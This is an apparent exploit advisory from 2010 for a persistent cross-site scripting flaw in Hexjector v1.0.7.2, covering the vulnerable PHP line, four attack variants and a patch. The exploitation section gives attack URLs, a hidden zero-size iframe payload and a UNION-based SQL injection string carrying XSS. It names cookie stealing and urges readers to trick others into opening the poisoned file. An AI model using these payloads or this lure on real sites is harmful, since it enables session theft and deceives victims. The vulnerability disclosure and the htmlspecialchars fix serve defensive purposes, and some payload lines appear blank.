@@ -1,0 +1,160 @@
+# Exploit Title: Hexjector Persistent XSS (<=v1.0.7.2)
+# Date: 25/5/2010
+# Author: Hexon
+# Software Link:
+https://sourceforge.net/projects/hexjector/files/Hexjector(Win32)/Hexjector
+v1.0.7.2.zip/download
+# Version: v1.0.7.2 and below
+# Tested on: Windows XP SP2, Windows 7,Ubuntu 9.10
+# Code : http://localhost/Hexjector/hexjector.php?site=[XSSCode]&injsubmit=Submit+Query&custom_parameter=
+
+
+------------------
+Vulnerability
+------------------
+
+Locate This code in Line 91:
+(It differs in each version , this is based on Hexjector v1.0.7.2)
+$o_urlx = "URL : < ". $url2 ." >"."<br \>";
+
+$url2 is not filtered so XSS codes can be executed.
+
+You would need to find a site that is vulnerable either to XSS or SQL
+Injection
+to generate this vulnerability.A site that is vulnerable to XSS only will
+also
+work because my Hexjector will not stop running unlike Havij that will
+detect
+that it is uninjectable and stop working.
+
+-----------------
+Exploitation
+-----------------
+
+You can insert javascript,html codes into the File Dump Created.
+
+There are a few variations for to exploit this :
+1.Use XSS codes directly in a XSS Vulnerable site
+2.Use XSS codes directly.
+3.Use SiXSS to generate a XSS code in a SQL Injection Vulnerable Site.
+4.Include XSS code after the vulnerable parameter in a SQL Injection
+Vulnerable Site.
+
+------------------------------------------------------------------------------------------
+1.Use XSS codes directly in a XSS Vulnerable site
+
+Example :
+
+http://localhost/Hexjector/hexjector.php?site=[Site with XSS
+Vulnerability]&injsubmit=Submit+Query&custom_parameter=
+
+You can replace [Site with XSS Vulnerability] with XSS codes like :
+
+- 
+- <iframe src="http://localhost/hexjector/" height=0 width=0></iframe>
+
+and many others. This is just a basic example.
+
+------------------------------------------------------------------------------------------
+2.Use XSS codes directly.
+
+Example :
+
+http://localhost/Hexjector/hexjector.php?site=[XSSCode]&injsubmit=Submit+Query&custom_parameter=
+
+You can replace [XSS Code] with XSS codes like :
+
+- 
+- <iframe src="http://localhost/hexjector/" height=0 width=0></iframe>
+
+and many others. This is just a basic example.
+
+
+------------------------------------------------------------------------------------------
+3.Use SiXSS to generate a XSS code in a SQL Injection Vulnerable Site.
+
+Example :
+
+http://localhost/Hexjector/hexjector.php?site=[SiXSS]&injsubmit=Submit+Query&custom_parameter=
+
+Example of [SiXSS]:
+
+-2 union select 1,[XSS],3
+
+(Assume that Column count = 3 and String column = 2)
+For your acknowledge , String column is the column number where the data
+produces
+output at the site.
+
+You can replace [XSS] with XSS codes like :
+
+- 
+- <iframe src="http://localhost/hexjector/" height=0 width=0></iframe>
+
+and many others. This is just a basic example.
+
+------------------------------------------------------------------------------------------
+4.Include XSS code after the vulnerable parameter in a SQL Injection
+Vulnerable Site.
+
+Example :
+
+http://localhost/Hexjector/hexjector.php?site=[VulnerableParameter][XSS]&injsubmit=Submit+Query&custom_parameter=
+
+[Value] is the SQL Injection Vulnerable Site with its parameter.
+Example :
+
+http://localhost/sqli.php?id=2
+
+
+You can replace [XSS] with XSS codes like :
+
+- 
+- <iframe src="http://localhost/hexjector/" height=0 width=0></iframe>
+
+and many others. This is just a basic example.
+
+
+------------------------------------------------------------------------------------------
+
+NOTE :
+Other XSS method can be used:
+-Iframe
+-Redirection
+-Cookie Stealing and many others.
+
+After you have tried either one (all of them are similar in a way or two but
+
+this is just to show you all of the ways to do it) , a html dump will be
+generated (File is saved as [HexDV(4/5)](32charlength).html) and open it.
+
+
+Use your creativity to trick others to go to this file and you will
+get the things that you want.
+
+---------
+Patch
+---------
+
+Replace the vulnerable line with this :
+$o_urlx = "URL : < ". htmlspecialchars($url2,ENT_QUOTES) ." >"."<br \>";
+
+The code($o_urlx) differs in each version so just find it manually and
+replace the
+$url2 with the htmlspecialchars($url2,ENT_QUOTES).
+
+Do not use replace or replace all functions as Hexjector uses a lot of $url2
+
+and only one of it is vulnerable so find it manually. Replacing some or all
+of
+it WILL definitely bring a slow down in terms of performance as
+htmlspecialchars will take some time to execute.
+
+This will patch the non-persistent XSS vulnerability as well.
+
+----------------
+Queries ??
+----------------
+
+Any questions regarding this Vulnerability,Please email to
+Hexjector@gmail.com or hkhexon@gmail.com.
